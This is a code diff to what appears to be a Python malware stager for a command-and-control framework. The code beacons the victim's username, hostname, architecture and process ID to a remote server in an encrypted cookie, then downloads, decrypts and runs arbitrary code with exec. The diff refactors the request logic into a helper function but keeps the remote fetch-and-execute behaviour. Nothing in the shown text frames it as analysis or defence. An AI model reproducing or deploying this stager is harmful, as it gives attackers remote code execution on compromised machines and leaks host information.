@@ -20,7 +20,7 @@ else: r=urllib2.Request(url,headers={'User-agent':ua})
 res=urllib2.urlopen(r);d=res.read();
 try:b=bytes.fromhex(d[1:].decode("utf-8")).decode("utf-8");s=hashlib.sha512(b.encode("utf-8")).hexdigest()
 except:c=d[1:];b=c.decode("hex");s=hashlib.sha512(b).hexdigest()
-if pykey in b and pyhash == s and cstr < kdn: 
+if pykey in b and pyhash == s and cstr < kdn:
     try:exec(bytes.fromhex(d[1:].decode("utf-8")).decode("utf-8"))
     except:exec(b)
 else: sys.exit(0)
@@ -35,7 +35,33 @@ un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid()
 is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
 hn=socket.gethostname();o=urllib2.build_opener()
 encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,urlid))
-if hh[0]:r=urllib2.Request(url2,headers={'Host':hh[0],'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
-else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
-res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\0');
-exec(base64.b64decode(x))
+
+def send_request(uri, headers=None, data=None):
+
+    url = f"{serverclean[0]}{uri}"
+
+    if ua and not hh:
+        request_headers = ({"User-Agent": f"{ua}"})
+    elif ua and hh:
+        request_headers = ({"User-Agent": f"{ua}", "Host": f"{hh[0]}"})
+
+    if headers:
+        request_headers.update(headers)
+
+    if data:
+        request = urllib2.Request(url, headers=request_headers, data=data)
+    else:
+        request = urllib2.Request(url, headers=request_headers)
+
+    response = urllib2.urlopen(request)
+    if not response:
+        return None
+    body = response.read()
+    try:
+        encrypted_result = body.decode("utf-8")
+        decrypted_result = decrypt(key, encrypted_result).rstrip('\0')
+        return base64.b64decode(decrypted_result).decode("utf-8")
+    except Exception as e:
+        return None
+
+exec(send_request(x, headers={'Cookie':'SessionID=%s' % encsid}))
